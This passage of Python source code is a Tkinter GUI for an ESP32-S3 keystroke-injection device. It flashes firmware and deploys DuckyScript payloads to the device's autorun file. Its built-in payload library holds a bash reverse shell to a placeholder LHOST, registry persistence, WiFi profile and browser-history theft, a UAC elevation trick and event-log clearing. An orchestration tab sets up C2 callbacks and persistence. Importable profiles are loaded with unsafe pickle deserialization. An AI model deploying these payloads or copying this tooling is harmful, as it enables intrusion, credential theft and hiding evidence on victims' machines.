        dest = filedialog.askdirectory(title="Select mounted SD card folder")
        if not dest:
            return
        try:
            # Write a minimal autorun and layout for verification
            sample = "REM Sample autorun\nLED_OFF\nREM Add your script here\n"
            with open(os.path.join(dest, "autorun.ds"), "w", newline="\r\n", encoding="utf-8") as f:
                f.write(sample)
            with open(os.path.join(dest, "layout.txt"), "w", encoding="utf-8") as lf:
                lf.write((self._layout_for_firmware() or "en-US") + "\n")
            with open(os.path.join(dest, "README.txt"), "w", encoding="utf-8") as rf:
                rf.write("If the device boots, browse to http://4.3.2.1:8080 and verify /data.json.\n")
            messagebox.showinfo("SD Assistant", "Wrote sample autorun.ds, layout.txt, README.txt")
        except Exception as e:
            messagebox.showerror("SD Assistant", str(e))

    def flash_prebuilt_firmware(self):
        device_info = self.device_combobox.get()
        if not device_info:
            self.flasher_console_text.insert(tk.END, "Please select a device first.\n")
            return
        device = device_info.split(" - ")[0]
        path = filedialog.askopenfilename(title="Select firmware .bin (app image)", filetypes=[("Firmware","*.bin")])
        if not path:
            return
        self.flasher_console_text.delete("1.0", tk.END)
        self.flasher_console_text.insert(tk.END, f"Uploading prebuilt app to {device}...\n")
        threading.Thread(target=self._flash_prebuilt_thread, args=(device, path), daemon=True).start()

    def _flash_prebuilt_thread(self, device, bin_path):
        try:
            if not self._ensure_platformio(self.flasher_console_text):
                return
            # Do NOT erase when only writing app image
            baud = 115200 if (hasattr(self, "low_baud_var") and self.low_baud_var.get()==1) else 460800
            cmd = (
                f"pio pkg exec --package \"platformio/tool-esptoolpy\" -- esptool.py "
                f"--chip esp32s3 --port {device} --baud {baud} write_flash 0x10000 \"{bin_path}\""
            )
            self.run_command(cmd, self.flasher_console_text)
            self.flasher_console_text.insert(tk.END, "\nPrebuilt app upload complete! If device was erased, you must flash full image via PlatformIO.\n")
        except Exception as e:
            self.flasher_console_text.insert(tk.END, f"\nError uploading prebuilt app: {e}\n")

    # ===== NEW FEATURES =====
    
    def create_payload_library_tab(self):
        """Payload Library with categorized templates"""
        library_frame = tk.Frame(self.notebook, padding=15)
        self.notebook.add(library_frame, text="📚 Payloads")
        
        # Search and filter
        search_frame = tk.Frame(library_frame)
        search_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(search_frame, text="🔍 Search:").pack(side=tk.LEFT, padx=(0, 10))
        self.payload_search = tk.Entry(search_frame, font=("Arial", 10))
        self.payload_search.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        
        tk.Label(search_frame, text="Category:").pack(side=tk.LEFT, padx=(10, 5))
        self.payload_category = tk.Combobox(search_frame, state="readonly", width=15,
                                           values=["All", "Recon", "Persistence", "Exfiltration", "Privilege Escalation", "Evasion"])
        self.payload_category.set("All")
        self.payload_category.pack(side=tk.LEFT, padx=(0, 10))
        
        tk.Button(search_frame, text="Filter", command=self.filter_payloads).pack(side=tk.LEFT, padx=5)
        
        # Payload list
        list_frame = tk.LabelFrame(library_frame, text="Available Payloads", padding=10)
        list_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Treeview with columns
        columns = ("Category", "OS", "Description")
        self.payload_tree = tk.Treeview(list_frame, columns=columns, show="tree headings", height=10)
        self.payload_tree.heading("#0", text="Name")
        self.payload_tree.heading("Category", text="Category")
        self.payload_tree.heading("OS", text="Target OS")
        self.payload_tree.heading("Description", text="Description")
        
        self.payload_tree.column("#0", width=200)
        self.payload_tree.column("Category", width=120)
        self.payload_tree.column("OS", width=80)
        self.payload_tree.column("Description", width=300)
        
        scrollbar = tk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.payload_tree.yview)
        self.payload_tree.configure(yscrollcommand=scrollbar.set)
        
        self.payload_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Payload preview
        preview_frame = tk.LabelFrame(library_frame, text="Payload Preview", padding=10)
        preview_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        self.payload_preview = tk.Text(preview_frame, height=8, bg="#0a0a0a", fg="#00ff00",
                                      font=("Courier", 9), insertbackground="#00ff00", wrap=tk.NONE)
        self.payload_preview.pack(fill=tk.BOTH, expand=True)
        
        # Actions
        action_frame = tk.Frame(library_frame)
        action_frame.pack(fill=tk.X)
        
        tk.Button(action_frame, text="✏️ Edit in Editor", command=self.load_payload_to_editor).pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="💾 Deploy to Device", command=self.deploy_payload_direct, style="Action.TButton").pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="➕ Add Custom", command=self.add_custom_payload).pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="🔒 Encrypt", command=self.encrypt_payload).pack(side=tk.LEFT, padx=5)
        
        # Bind selection event
        self.payload_tree.bind("<<TreeviewSelect>>", self.on_payload_select)
        
        # Initialize library
        self._init_payload_library()
    
    def create_serial_monitor_tab(self):
        """Serial Monitor for real-time device debugging"""
        monitor_frame = tk.Frame(self.notebook, padding=15)
        self.notebook.add(monitor_frame, text="📡 Monitor")
        
        # Connection controls
        conn_frame = tk.LabelFrame(monitor_frame, text="Connection", padding=10)
        conn_frame.pack(fill=tk.X, pady=(0, 10))
        
        controls = tk.Frame(conn_frame)
        controls.pack(fill=tk.X)
        
        tk.Label(controls, text="Port:").pack(side=tk.LEFT, padx=(0, 5))
        self.monitor_port = tk.Combobox(controls, state="readonly", width=25)
        self.monitor_port.pack(side=tk.LEFT, padx=(0, 10))
        
        tk.Label(controls, text="Baud:").pack(side=tk.LEFT, padx=(0, 5))
        self.monitor_baud = tk.Combobox(controls, state="readonly", width=10,
                                       values=["9600", "115200", "230400", "460800", "921600"])
        self.monitor_baud.set("115200")
        self.monitor_baud.pack(side=tk.LEFT, padx=(0, 10))
        
        tk.Button(controls, text="🔍 Detect Ports", command=self.refresh_monitor_ports).pack(side=tk.LEFT, padx=5)
        self.monitor_connect_btn = tk.Button(controls, text="▶️ Connect", command=self.toggle_serial_monitor, style="Action.TButton")
        self.monitor_connect_btn.pack(side=tk.LEFT, padx=5)
        
        # Monitor output
        output_frame = tk.LabelFrame(monitor_frame, text="Serial Output", padding=10)
        output_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        self.monitor_output = scrolledtext.ScrolledText(output_frame, bg="#0a0a0a", fg="#00ff00",
                                                        font=("Courier", 9), insertbackground="#00ff00", wrap=tk.WORD)
        self.monitor_output.pack(fill=tk.BOTH, expand=True)
        
        # Command input
        cmd_frame = tk.Frame(monitor_frame)
        cmd_frame.pack(fill=tk.X)
        
        tk.Label(cmd_frame, text="Send:").pack(side=tk.LEFT, padx=(0, 5))
        self.monitor_cmd = tk.Entry(cmd_frame, font=("Courier", 10))
        self.monitor_cmd.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        self.monitor_cmd.bind("<Return>", lambda e: self.send_serial_command())
        
        tk.Button(cmd_frame, text="Send", command=self.send_serial_command).pack(side=tk.LEFT, padx=5)
        tk.Button(cmd_frame, text="Clear", command=lambda: self.monitor_output.delete("1.0", tk.END)).pack(side=tk.LEFT, padx=5)
        tk.Button(cmd_frame, text="📝 Save Log", command=self.save_monitor_log).pack(side=tk.LEFT, padx=5)
        
        # Monitor state
        self.serial_connection = None
        self.monitor_running = False
        self.monitor_thread = None
        
        # Auto-detect ports
        self.refresh_monitor_ports()
    
    def create_profiles_tab(self):
        """Profile Manager for saving/loading configurations"""
        profiles_frame = tk.Frame(self.notebook, padding=15)
        self.notebook.add(profiles_frame, text="💼 Profiles")
        
        # Profile list
        list_frame = tk.LabelFrame(profiles_frame, text="Saved Profiles", padding=10)
        list_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        self.profiles_listbox = Listbox(list_frame, font=("Arial", 10), height=15)
        self.profiles_listbox.pack(fill=tk.BOTH, expand=True)
        self.profiles_listbox.bind("<<ListboxSelect>>", self.on_profile_select)
        
        # Profile details
        details_frame = tk.LabelFrame(profiles_frame, text="Profile Details", padding=10)
        details_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.profile_details = tk.Text(details_frame, height=6, bg="#0a0a0a", fg="#00ff00",
                                      font=("Courier", 9), state=tk.DISABLED)
        self.profile_details.pack(fill=tk.X)
        
        # Actions
        action_frame = tk.Frame(profiles_frame)
        action_frame.pack(fill=tk.X)
        
        tk.Button(action_frame, text="💾 Save Current", command=self.save_profile, style="Action.TButton").pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="📂 Load Selected", command=self.load_profile).pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="🗑️ Delete", command=self.delete_profile).pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="📤 Export", command=self.export_profile).pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="📥 Import", command=self.import_profile).pack(side=tk.LEFT, padx=5)
        
        # Load profiles
        self._load_profiles_list()
    
    # Payload Library Functions
    def _init_payload_library(self):
        """Initialize payload library with default templates"""
        os.makedirs("payloads", exist_ok=True)
        
        # Default payloads
        default_payloads = [
            {"name": "System Info Recon", "category": "Recon", "os": "Windows",
             "description": "Collect system information",
             "script": "REM System Info Collection\nGUI r\nDELAY 500\nSTRING cmd /c systeminfo > %temp%\\\\sysinfo.txt\nENTER\n"},
            {"name": "Network Scan", "category": "Recon", "os": "Windows",
             "description": "Scan network configuration",
             "script": "REM Network Scan\nGUI r\nDELAY 500\nSTRING cmd /c ipconfig /all > %temp%\\\\netinfo.txt\nENTER\n"},
            {"name": "Reverse Shell", "category": "Persistence", "os": "Linux",
             "description": "Establish reverse shell connection",
             "script": "REM Reverse Shell\nSTRING bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1\nENTER\n"},
            {"name": "Registry Persistence", "category": "Persistence", "os": "Windows",
             "description": "Add registry run key",
             "script": "REM Registry Persistence\nGUI r\nDELAY 500\nSTRING cmd /c reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\nENTER\n"},
            {"name": "WiFi Password Dump", "category": "Exfiltration", "os": "Windows",
             "description": "Extract saved WiFi passwords",
             "script": "REM WiFi Password Extraction\nGUI r\nDELAY 500\nSTRING cmd /c netsh wlan show profiles\nENTER\n"},
            {"name": "Browser History", "category": "Exfiltration", "os": "Windows",
             "description": "Extract browser history",
             "script": "REM Browser History\nGUI r\nDELAY 500\nSTRING cmd /c copy %APPDATA%\\\\..\\\\Local\\\\Google\\\\Chrome\\\\User\\ Data\\\\Default\\\\History %temp%\\\\\nENTER\n"},
            {"name": "UAC Bypass", "category": "Privilege Escalation", "os": "Windows",
             "description": "Bypass User Account Control",
             "script": "REM UAC Bypass\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\n"},
            {"name": "Clear Event Logs", "category": "Evasion", "os": "Windows",
             "description": "Clear Windows event logs",
             "script": "REM Clear Logs\nGUI r\nDELAY 500\nSTRING cmd /c wevtutil cl System\nENTER\n"},
        ]
        
        # Save defaults if they don't exist
        for payload in default_payloads:
            filepath = os.path.join("payloads", f"{payload['name'].replace(' ', '_')}.json")
            if not os.path.exists(filepath):
                with open(filepath, "w") as f:
                    json.dump(payload, f, indent=2)
        
        self.filter_payloads()
    
    def filter_payloads(self):
        """Filter payloads based on search and category"""
        self.payload_tree.delete(*self.payload_tree.get_children())
        
        search_text = self.payload_search.get().lower()
        category_filter = self.payload_category.get()
        
        try:
            for filename in os.listdir("payloads"):
                if filename.endswith(".json"):
                    with open(os.path.join("payloads", filename), "r") as f:
                        payload = json.load(f)
                    
                    # Apply filters
                    if category_filter != "All" and payload.get("category") != category_filter:
                        continue
                    if search_text and search_text not in payload.get("name", "").lower() and search_text not in payload.get("description", "").lower():
                        continue
                    
                    # Add to tree
                    self.payload_tree.insert("", tk.END, text=payload.get("name", "Unknown"),
                                           values=(payload.get("category", ""),
                                                  payload.get("os", ""),
                                                  payload.get("description", "")),
                                           tags=(filename,))
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load payloads: {e}")
    
    def on_payload_select(self, event):
        """Show payload preview when selected"""
        selection = self.payload_tree.selection()
        if not selection:
            return
        
        item = self.payload_tree.item(selection[0])
        filename = item['tags'][0]
        
        try:
            with open(os.path.join("payloads", filename), "r") as f:
                payload = json.load(f)
            
            self.payload_preview.delete("1.0", tk.END)
            self.payload_preview.insert(tk.END, payload.get("script", ""))
        except Exception as e:
            self.payload_preview.delete("1.0", tk.END)
            self.payload_preview.insert(tk.END, f"Error loading payload: {e}")
    
    def load_payload_to_editor(self):
        """Load selected payload into DuckyScript editor"""
        selection = self.payload_tree.selection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a payload first.")
            return
        
        item = self.payload_tree.item(selection[0])
        filename = item['tags'][0]
        
        try:
            with open(os.path.join("payloads", filename), "r") as f:
                payload = json.load(f)
            
            self.duckyscript_editor.delete("1.0", tk.END)
            self.duckyscript_editor.insert(tk.END, payload.get("script", ""))
            self.manifest_name.delete(0, tk.END)
            self.manifest_name.insert(0, payload.get("name", ""))
            self.target_os.set(payload.get("os", "generic").lower())
            
            # Switch to DuckyScript tab
            self.notebook.select(4)  # DuckyScript tab index
            
            messagebox.showinfo("Loaded", f"Payload '{payload.get('name')}' loaded into editor")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load payload: {e}")
    
    def deploy_payload_direct(self):
        """Deploy payload directly to device"""
        selection = self.payload_tree.selection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a payload first.")
            return
        
        if not self.armed_var.get():
            messagebox.showwarning("Not Armed", "Enable 'Armed (consent)' in DuckyScript editor first.")
            return
        
        drive_path = self.selected_drive.get()
        if not drive_path:
            messagebox.showerror("Error", "Please select the USBArmyKnife drive first.")
            return
        
        item = self.payload_tree.item(selection[0])
        filename = item['tags'][0]
        
        try:
            with open(os.path.join("payloads", filename), "r") as f:
                payload = json.load(f)
            
            # Write to device
            autorun_path = os.path.join(drive_path, "autorun.ds")
            with open(autorun_path, "w", newline="\r\n", encoding="utf-8") as f:
                f.write(payload.get("script", ""))
            
            messagebox.showinfo("Deployed", f"Payload '{payload.get('name')}' deployed to device")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to deploy payload: {e}")
    
    def add_custom_payload(self):
        """Add custom payload to library"""
        name = simpledialog.askstring("Payload Name", "Enter payload name:")
        if not name:
            return
        
        payload = {
            "name": name,
            "category": "Custom",
            "os": "generic",
            "description": "Custom payload",
            "script": self.duckyscript_editor.get("1.0", tk.END).strip()
        }
        
        filepath = os.path.join("payloads", f"{name.replace(' ', '_')}.json")
        try:
            with open(filepath, "w") as f:
                json.dump(payload, f, indent=2)
            messagebox.showinfo("Success", f"Payload '{name}' added to library")
            self.filter_payloads()
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save payload: {e}")
    
    def encrypt_payload(self):
        """Encrypt payload with password"""
        selection = self.payload_tree.selection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a payload first.")
            return
        
        password = simpledialog.askstring("Encryption", "Enter password:", show="*")
        if not password:
            return
        
        item = self.payload_tree.item(selection[0])
        filename = item['tags'][0]
        
        try:
            with open(os.path.join("payloads", filename), "r") as f:
                payload = json.load(f)
            
            script = payload.get("script", "")
            
            # Simple encryption using Fernet
            if not CRYPTO_AVAILABLE:
                messagebox.showerror("Error", "Cryptography library not installed.\nInstall with: pip install cryptography")
                return
            
            salt = os.urandom(16)
            kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
            key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
            f = Fernet(key)
            encrypted = f.encrypt(script.encode())
            
            # Save encrypted payload
            encrypted_payload = {
                "name": payload.get("name") + " (Encrypted)",
                "category": payload.get("category"),
                "os": payload.get("os"),
                "description": payload.get("description") + " [ENCRYPTED]",
                "encrypted": True,
                "salt": base64.b64encode(salt).decode(),
                "data": base64.b64encode(encrypted).decode()
            }
            
            enc_path = os.path.join("payloads", f"{payload.get('name').replace(' ', '_')}_encrypted.json")
            with open(enc_path, "w") as f:
                json.dump(encrypted_payload, f, indent=2)
            
            messagebox.showinfo("Success", "Payload encrypted and saved")
            self.filter_payloads()
        except Exception as e:
            messagebox.showerror("Error", f"Encryption failed: {e}")
    
    # Serial Monitor Functions
    def refresh_monitor_ports(self):
        """Refresh available serial ports"""
        ports = serial.tools.list_ports.comports()
        port_list = [f"{port.device} - {port.description}" for port in ports]
        self.monitor_port['values'] = port_list
        if port_list:
            self.monitor_port.current(0)
    
    def toggle_serial_monitor(self):
        """Start/stop serial monitoring"""
        if self.monitor_running:
            self.stop_serial_monitor()
        else:
            self.start_serial_monitor()
    
    def start_serial_monitor(self):
        """Start serial monitoring thread"""
        port_info = self.monitor_port.get()
        if not port_info:
            messagebox.showwarning("No Port", "Please select a serial port")
            return
        
        port = port_info.split(" - ")[0]
        baud = int(self.monitor_baud.get())
        
        try:
            self.serial_connection = serial.Serial(port, baud, timeout=1)
            self.monitor_running = True
            self.monitor_connect_btn.config(text="⏸️ Disconnect")
            
            # Start reading thread
            self.monitor_thread = threading.Thread(target=self._serial_read_loop, daemon=True)
            self.monitor_thread.start()
            
            self.monitor_output.insert(tk.END, f"[Connected to {port} at {baud} baud]\n")
            self.monitor_output.see(tk.END)
        except Exception as e:
            messagebox.showerror("Connection Error", f"Failed to connect: {e}")
            self.monitor_running = False
    
    def stop_serial_monitor(self):
        """Stop serial monitoring"""
        self.monitor_running = False
        if self.serial_connection and self.serial_connection.is_open:
            self.serial_connection.close()
        self.monitor_connect_btn.config(text="▶️ Connect")
        self.monitor_output.insert(tk.END, "\n[Disconnected]\n")
        self.monitor_output.see(tk.END)
    
    def _serial_read_loop(self):
        """Background thread to read serial data"""
        while self.monitor_running:
            try:
                if self.serial_connection and self.serial_connection.in_waiting > 0:
                    data = self.serial_connection.readline().decode('utf-8', errors='ignore')
                    self.monitor_output.insert(tk.END, data)
                    self.monitor_output.see(tk.END)
                time.sleep(0.1)
            except Exception as e:
                self.monitor_output.insert(tk.END, f"\n[Error: {e}]\n")
                break
    
    def send_serial_command(self):
        """Send command via serial"""
        if not self.serial_connection or not self.serial_connection.is_open:
            messagebox.showwarning("Not Connected", "Connect to a serial port first")
            return
        
        cmd = self.monitor_cmd.get()
        if cmd:
            try:
                self.serial_connection.write((cmd + "\n").encode())
                self.monitor_output.insert(tk.END, f">> {cmd}\n")
                self.monitor_output.see(tk.END)
                self.monitor_cmd.delete(0, tk.END)
            except Exception as e:
                messagebox.showerror("Error", f"Failed to send: {e}")
    
    def save_monitor_log(self):
        """Save serial monitor log to file"""
        log_content = self.monitor_output.get("1.0", tk.END)
        filepath = filedialog.asksaveasfilename(defaultextension=".log",
                                               filetypes=[("Log files", "*.log"), ("All files", "*.*")])
        if filepath:
            try:
                with open(filepath, "w") as f:
                    f.write(log_content)
                messagebox.showinfo("Saved", "Log saved successfully")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save log: {e}")
    
    # Profile Management Functions
    def _load_profiles_list(self):
        """Load list of saved profiles"""
        os.makedirs("profiles", exist_ok=True)
        self.profiles_listbox.delete(0, tk.END)
        
        try:
            for filename in os.listdir("profiles"):
                if filename.endswith(".profile"):
                    self.profiles_listbox.insert(tk.END, filename[:-8])  # Remove .profile extension
        except Exception:
            pass
    
    def on_profile_select(self, event):
        """Show profile details when selected"""
        selection = self.profiles_listbox.curselection()
        if not selection:
            return
        
        profile_name = self.profiles_listbox.get(selection[0])
        filepath = os.path.join("profiles", f"{profile_name}.profile")
        
        try:
            with open(filepath, "rb") as f:
                profile = pickle.load(f)
            
            self.profile_details.config(state=tk.NORMAL)
            self.profile_details.delete("1.0", tk.END)
            
            details = [
                f"Name: {profile.get('name', 'N/A')}",
                f"Created: {profile.get('created', 'N/A')}",
                f"Layout: {profile.get('layout', 'N/A')}",
                f"Target OS: {profile.get('target_os', 'N/A')}",
                f"Has Script: {'Yes' if profile.get('script') else 'No'}",
                f"Description: {profile.get('description', 'N/A')}"
            ]
            
            self.profile_details.insert(tk.END, "\n".join(details))
            self.profile_details.config(state=tk.DISABLED)
        except Exception as e:
            self.profile_details.config(state=tk.NORMAL)
            self.profile_details.delete("1.0", tk.END)
            self.profile_details.insert(tk.END, f"Error loading profile: {e}")
            self.profile_details.config(state=tk.DISABLED)
    
    def save_profile(self):
        """Save current configuration as a profile"""
        name = simpledialog.askstring("Profile Name", "Enter profile name:")
        if not name:
            return
        
        description = simpledialog.askstring("Description", "Enter profile description (optional):") or ""
        
        profile = {
            "name": name,
            "created": datetime.utcnow().isoformat() + "Z",
            "description": description,
            "layout": self._selected_layout(),
            "target_os": self.target_os.get(),
            "script": self.duckyscript_editor.get("1.0", tk.END).strip(),
            "manifest_name": self.manifest_name.get(),
            "manifest_notes": self.manifest_notes.get(),
            "drive_path": self.selected_drive.get(),
            "agent_img_path": self.agent_img_path_var.get() if hasattr(self, 'agent_img_path_var') else ""
        }
        
        filepath = os.path.join("profiles", f"{name}.profile")
        try:
            with open(filepath, "wb") as f:
                pickle.dump(profile, f)
            messagebox.showinfo("Success", f"Profile '{name}' saved successfully")
            self._load_profiles_list()
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save profile: {e}")
    
    def load_profile(self):
        """Load selected profile"""
        selection = self.profiles_listbox.curselection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a profile first.")
            return
        
        profile_name = self.profiles_listbox.get(selection[0])
        filepath = os.path.join("profiles", f"{profile_name}.profile")
        
        try:
            with open(filepath, "rb") as f:
                profile = pickle.load(f)
            
            # Restore settings
            self.layout_combobox.set(profile.get("layout", "en-US (default)"))
            self.target_os.set(profile.get("target_os", "generic"))
            self.duckyscript_editor.delete("1.0", tk.END)
            self.duckyscript_editor.insert(tk.END, profile.get("script", ""))
            self.manifest_name.delete(0, tk.END)
            self.manifest_name.insert(0, profile.get("manifest_name", ""))
            self.manifest_notes.delete(0, tk.END)
            self.manifest_notes.insert(0, profile.get("manifest_notes", ""))
            if profile.get("drive_path"):
                self.selected_drive.set(profile.get("drive_path"))
            if profile.get("agent_img_path") and hasattr(self, 'agent_img_path_var'):
                self.agent_img_path_var.set(profile.get("agent_img_path"))
            
            messagebox.showinfo("Loaded", f"Profile '{profile_name}' loaded successfully")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load profile: {e}")
    
    def delete_profile(self):
        """Delete selected profile"""
        selection = self.profiles_listbox.curselection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a profile first.")
            return
        
        profile_name = self.profiles_listbox.get(selection[0])
        
        if messagebox.askyesno("Confirm Delete", f"Delete profile '{profile_name}'?"):
            filepath = os.path.join("profiles", f"{profile_name}.profile")
            try:
                os.remove(filepath)
                messagebox.showinfo("Deleted", f"Profile '{profile_name}' deleted")
                self._load_profiles_list()
                self.profile_details.config(state=tk.NORMAL)
                self.profile_details.delete("1.0", tk.END)
                self.profile_details.config(state=tk.DISABLED)
            except Exception as e:
                messagebox.showerror("Error", f"Failed to delete profile: {e}")
    
    def export_profile(self):
        """Export profile to external file"""
        selection = self.profiles_listbox.curselection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a profile first.")
            return
        
        profile_name = self.profiles_listbox.get(selection[0])
        src = os.path.join("profiles", f"{profile_name}.profile")
        
        dest = filedialog.asksaveasfilename(defaultextension=".profile",
                                           initialfile=f"{profile_name}.profile",
                                           filetypes=[("Profile files", "*.profile"), ("All files", "*.*")])
        if dest:
            try:
                shutil.copy2(src, dest)
                messagebox.showinfo("Exported", f"Profile exported to {dest}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export: {e}")
    
    def import_profile(self):
        """Import profile from external file"""
        src = filedialog.askopenfilename(title="Select profile to import",
                                        filetypes=[("Profile files", "*.profile"), ("All files", "*.*")])
        if not src:
            return
        
        profile_name = os.path.basename(src)[:-8]  # Remove .profile extension
        dest = os.path.join("profiles", os.path.basename(src))
        
        try:
            shutil.copy2(src, dest)
            messagebox.showinfo("Imported", f"Profile '{profile_name}' imported successfully")
            self._load_profiles_list()
        except Exception as e:
            messagebox.showerror("Error", f"Failed to import: {e}")
    
    # Payload Orchestration Functions
    def create_orchestration_tab(self):
        """Payload Chaining & Orchestration for multi-stage attacks"""
        orch_frame = tk.Frame(self.notebook, padding=15)
        self.notebook.add(orch_frame, text="🔗 Orchestration")
        
        # Chain builder
        builder_frame = tk.LabelFrame(orch_frame, text="Payload Chain Builder", padding=10)
        builder_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Left: Available stages
        left_frame = tk.Frame(builder_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
        
        tk.Label(left_frame, text="Available Stages", font=("Arial", 11, "bold")).pack(pady=(0, 5))
        
        self.stage_listbox = Listbox(left_frame, font=("Arial", 9), height=15)
        self.stage_listbox.pack(fill=tk.BOTH, expand=True)
        
        # Populate with stage types
        stages = [
            "Initial Access",
            "Recon",
            "Privilege Escalation",
            "Credential Dump",
            "Lateral Movement",
            "Data Exfiltration",
            "Persistence",
            "Cleanup/Evasion",
            "Network Callback",
            "Custom Command"
        ]
        for stage in stages:
            self.stage_listbox.insert(tk.END, stage)
        
        # Middle: Controls
        control_frame = tk.Frame(builder_frame)
        control_frame.pack(side=tk.LEFT, padx=10)
        
        tk.Button(control_frame, text="➡️\nAdd", command=self.add_stage_to_chain).pack(pady=5)
        tk.Button(control_frame, text="⬆️\nMove Up", command=self.move_stage_up).pack(pady=5)
        tk.Button(control_frame, text="⬇️\nMove Down", command=self.move_stage_down).pack(pady=5)
        tk.Button(control_frame, text="❌\nRemove", command=self.remove_stage).pack(pady=5)
        
        # Right: Chain sequence
        right_frame = tk.Frame(builder_frame)
        right_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        tk.Label(right_frame, text="Execution Chain", font=("Arial", 11, "bold")).pack(pady=(0, 5))
        
        self.chain_listbox = Listbox(right_frame, font=("Arial", 9), height=15)
        self.chain_listbox.pack(fill=tk.BOTH, expand=True)
        self.chain_listbox.bind("<<ListboxSelect>>", self.on_chain_stage_select)
        
        # Stage configuration
        config_frame = tk.LabelFrame(orch_frame, text="Stage Configuration", padding=10)
        config_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Config grid
        tk.Label(config_frame, text="Delay (ms):").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.stage_delay = tk.Entry(config_frame, width=15)
        self.stage_delay.insert(0, "1000")
        self.stage_delay.grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)
        
        tk.Label(config_frame, text="Condition:").grid(row=0, column=2, sticky=tk.W, padx=5, pady=5)
        self.stage_condition = tk.Combobox(config_frame, state="readonly", width=20,
                                          values=["Always", "If Windows", "If Linux", "If Admin", "If Network"])
        self.stage_condition.set("Always")
        self.stage_condition.grid(row=0, column=3, sticky=tk.W, padx=5, pady=5)
        
        tk.Label(config_frame, text="On Failure:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.stage_failure = tk.Combobox(config_frame, state="readonly", width=15,
                                        values=["Continue", "Abort", "Retry", "Skip Next"])
        self.stage_failure.set("Continue")
        self.stage_failure.grid(row=1, column=1, sticky=tk.W, padx=5, pady=5)
        
        tk.Label(config_frame, text="Payload:").grid(row=1, column=2, sticky=tk.W, padx=5, pady=5)
        self.stage_payload = tk.Entry(config_frame, width=30)
        self.stage_payload.grid(row=1, column=3, sticky=tk.EW, padx=5, pady=5)
        tk.Button(config_frame, text="...", command=self.browse_stage_payload, width=3).grid(row=1, column=4, padx=5, pady=5)
        
        config_frame.columnconfigure(3, weight=1)
        
        # C2 Integration
        c2_frame = tk.LabelFrame(orch_frame, text="C2 Integration", padding=10)
        c2_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(c2_frame, text="C2 Server:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.c2_server = tk.Entry(c2_frame, width=30)
        self.c2_server.insert(0, "http://192.168.1.100:8080")
        self.c2_server.grid(row=0, column=1, sticky=tk.EW, padx=5, pady=5)
        
        tk.Label(c2_frame, text="Callback Interval:").grid(row=0, column=2, sticky=tk.W, padx=5, pady=5)
        self.c2_interval = tk.Entry(c2_frame, width=10)
        self.c2_interval.insert(0, "60")
        self.c2_interval.grid(row=0, column=3, sticky=tk.W, padx=5, pady=5)
        tk.Label(c2_frame, text="seconds").grid(row=0, column=4, sticky=tk.W, padx=(0, 5))
        
        tk.Label(c2_frame, text="API Key:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.c2_apikey = tk.Entry(c2_frame, width=30, show="*")
        self.c2_apikey.grid(row=1, column=1, sticky=tk.EW, padx=5, pady=5)
        
        self.c2_enabled = tk.IntVar(value=0)
        tk.Checkbutton(c2_frame, text="Enable C2 Callbacks", variable=self.c2_enabled).grid(row=1, column=2, columnspan=3, sticky=tk.W, padx=5, pady=5)
        
        c2_frame.columnconfigure(1, weight=1)
        
        # Persistence options
        persist_frame = tk.LabelFrame(orch_frame, text="Persistence Mechanisms", padding=10)
        persist_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.persist_registry = tk.IntVar(value=0)
        self.persist_scheduled = tk.IntVar(value=0)
        self.persist_service = tk.IntVar(value=0)
        self.persist_startup = tk.IntVar(value=0)
        
        tk.Checkbutton(persist_frame, text="Registry Run Key (Windows)", variable=self.persist_registry).grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        tk.Checkbutton(persist_frame, text="Scheduled Task (Windows)", variable=self.persist_scheduled).grid(row=0, column=1, sticky=tk.W, padx=5, pady=2)
